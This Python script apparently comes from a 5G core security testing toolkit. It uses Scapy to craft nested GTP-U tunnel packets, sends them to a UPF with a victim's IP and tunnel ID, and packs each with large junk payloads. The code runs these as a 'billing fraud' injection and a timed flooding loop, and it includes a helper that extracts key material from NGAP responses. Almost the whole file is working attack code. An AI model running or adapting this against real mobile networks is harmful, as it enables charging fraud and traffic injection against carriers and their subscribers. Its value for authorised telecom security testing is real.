#!/usr/bin/env python3
from __future__ import annotations
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import logging
import time
from typing import TYPE_CHECKING
from core.config import TEST_CONFIG, validate_config
from core.response_verifier import ResponseVerifier
from core.progress_tracker import ProgressTracker
from core.resource_manager import retry_with_backoff
from rich.progress import Progress

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

if TYPE_CHECKING:
    from scapy.layers.inet import IP, UDP
    from scapy.packet import Raw
    from scapy.sendrecv import send, sr1, sniff
    from scapy.contrib.gtp import GTPHeader

try:
    from scapy.layers.inet import IP, UDP
    from scapy.packet import Raw
    from scapy.sendrecv import send, sr1, sniff
    from scapy.contrib.gtp import GTPHeader
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    logger.warning("Scapy not available")

def craft_gtpu_tunnel(outer_src_ip, outer_dst_ip, outer_teid, inner_src_ip, inner_dst_ip, inner_teid, inner_payload):
    try:
        inner_gtpu = GTPHeader(teid=inner_teid, gtp_type=255) / IP(src=inner_src_ip, dst=inner_dst_ip) / UDP(sport=2152, dport=2152) / Raw(load=inner_payload)
        outer_packet = IP(src=outer_src_ip, dst=outer_dst_ip) / UDP(sport=2152, dport=2152) / GTPHeader(teid=outer_teid, gtp_type=255) / inner_gtpu
        return outer_packet
    except Exception as e:
        logger.error(f"Failed to craft GTP-U tunnel: {e}")
        return None

def reflective_injection(upf_ip, outer_teid, victim_ip, victim_teid, junk_data_size=60000, count=10, iface=None, verify_responses=True):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    success_count = 0
    verified_count = 0
    responses_captured = []
    verifier = ResponseVerifier(timeout=2.0)
    
    try:
        with Progress() as progress:
            task = progress.add_task(f"[cyan]Billing Fraud Attack ({count} packets)", total=count)
            
            for i in range(count):
                try:
                    junk = b'\x00' * junk_data_size
                    inner_pkt = IP(src=TEST_CONFIG["inner_src"], dst=victim_ip) / UDP() / Raw(load=junk)
                    tunnel_pkt = craft_gtpu_tunnel(
                        outer_src_ip=TEST_CONFIG["outer_src"],
                        outer_dst_ip=upf_ip,
                        outer_teid=outer_teid,
                        inner_src_ip=TEST_CONFIG["inner_src"],
                        inner_dst_ip=victim_ip,
                        inner_teid=victim_teid,
                        inner_payload=bytes(inner_pkt)
                    )
                    
                    if tunnel_pkt:
                        send(tunnel_pkt, iface=iface, verbose=0)
                        success_count += 1
                        
                        if verify_responses:
                            try:
                                resp = sr1(tunnel_pkt, timeout=0.5, verbose=0)
                                if resp:
                                    verification = verifier.verify_gtp_response(resp, expected_teid=outer_teid)
                                    if verification.get("success"):
                                        verified_count += 1
                                        responses_captured.append({
                                            "packet_num": i + 1,
                                            "verification": verification
                                        })
                            except Exception as verify_err:
                                logger.debug(f"Response verification failed for packet {i+1}: {verify_err}")
                        
                        progress.update(task, advance=1, description=f"[green]Sent {i+1}/{count} packets")
                    else:
                        logger.warning(f"Failed to craft packet {i+1}/{count}")
                        progress.update(task, advance=1, description=f"[yellow]Craft failed {i+1}/{count}")
                
                except KeyboardInterrupt:
                    logger.warning("Attack interrupted by user")
                    break
                except Exception as packet_err:
                    logger.error(f"Error sending packet {i+1}: {packet_err}")
                    progress.update(task, advance=1)
        
        logger.info(f"Reflective injection complete: {success_count}/{count} packets sent")
        if verify_responses:
            logger.info(f"Response verification: {verified_count}/{success_count} responses verified")
        
        return {
            "packets_sent": success_count,
            "responses_verified": verified_count,
            "total_packets": count,
            "responses": responses_captured
        }
    except KeyboardInterrupt:
        logger.warning("Attack interrupted")
        return {"packets_sent": success_count, "responses_verified": verified_count, "interrupted": True}
    except Exception as e:
        logger.error(f"Reflective injection failed: {e}", exc_info=True)
        return {"packets_sent": success_count, "error": str(e)}

def extract_keys(ngap_resp):
    try:
        if hasattr(ngap_resp, 'successfulOutcome') and ngap_resp.procedureCode == 21:
            ies = ngap_resp.value.iEs
            for ie in ies:
                if ie.id == 46:
                    return ie.value
    except Exception as e:
        logger.error(f"Failed to extract keys: {e}")
    return None

@retry_with_backoff(max_retries=3, initial_delay=1.0)
def send_with_retry(packet, iface: str) -> bool:
    send(packet, iface=iface, verbose=0)
    return True


def timed_billing_attack(upf_ip: str, outer_teid: int, victim_ip: str, 
                         victim_teid: int, duration_seconds: int = 30) -> dict:
    tracker = ProgressTracker()
    start_time = time.time()
    packets_sent = 0
    captured_responses = []
    
    def capture_responses(pkt):
        captured_responses.append(pkt)
    
    with tracker.track("Timed Billing Attack", total=duration_seconds) as task_id:
        sniff(
            filter=f"udp port 2152 and host {upf_ip}",
            prn=capture_responses,
            timeout=1,
            store=0
        )
        
        while time.time() - start_time < duration_seconds:
            elapsed = time.time() - start_time
            junk = b'\x00' * 60000
            inner_pkt = IP(src=TEST_CONFIG["inner_src"], dst=victim_ip) / UDP() / Raw(load=junk)
            tunnel_pkt = craft_gtpu_tunnel(
                outer_src_ip=TEST_CONFIG["outer_src"],
                outer_dst_ip=upf_ip,
                outer_teid=outer_teid,
                inner_src_ip=TEST_CONFIG["inner_src"],
                inner_dst_ip=victim_ip,
                inner_teid=victim_teid,
                inner_payload=bytes(inner_pkt)
            )
            
            if tunnel_pkt:
                try:
                    send_with_retry(tunnel_pkt, TEST_CONFIG["interface"])
                    packets_sent += 1
                except Exception as e:
                    logger.debug(f"Send failed: {e}")
            
            tracker.update(task_id, completed=int(elapsed))
            time.sleep(0.01)
    
    return {
        "duration": time.time() - start_time,
        "packets_sent": packets_sent,
        "responses_captured": len(captured_responses),
        "rate": packets_sent / (time.time() - start_time) if packets_sent > 0 else 0
    }


if __name__ == "__main__":
    logger.info("Starting billing fraud test")
    reflective_injection(
        TEST_CONFIG["upf_ip"],
        TEST_CONFIG["outer_teid"],
        TEST_CONFIG["victim_ip"],
        TEST_CONFIG["victim_teid"]
    )

